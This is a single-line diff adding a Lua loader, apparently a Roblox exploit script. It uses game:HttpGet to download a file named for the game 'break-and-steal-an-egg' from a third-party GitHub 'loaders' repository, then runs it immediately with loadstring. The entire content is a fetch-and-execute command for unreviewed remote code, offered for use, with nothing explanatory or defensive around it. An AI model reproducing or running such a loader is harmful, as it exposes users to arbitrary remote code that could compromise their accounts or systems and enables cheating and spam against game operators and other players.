@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/break-and-steal-an-egg-spam7-kqvpuszsibv8yp.lua"))()
